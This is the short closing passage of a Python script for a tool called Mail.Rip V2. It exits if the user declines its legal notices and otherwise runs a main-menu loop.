if legal_confirm in ['n', 'no', 'NO']:
    clean()
    sys.exit(colorama.Fore.RED
             + '\nLegal Notices not confirmed.\nMail.Rip V2 cannot be used without confirming the '
             + '<< Legal Notices >>.\n\n')
else:
    pass
# start main menu:
while True:
    mainmenu()

# DrPython3 (C) 2021 @ GitHub.com
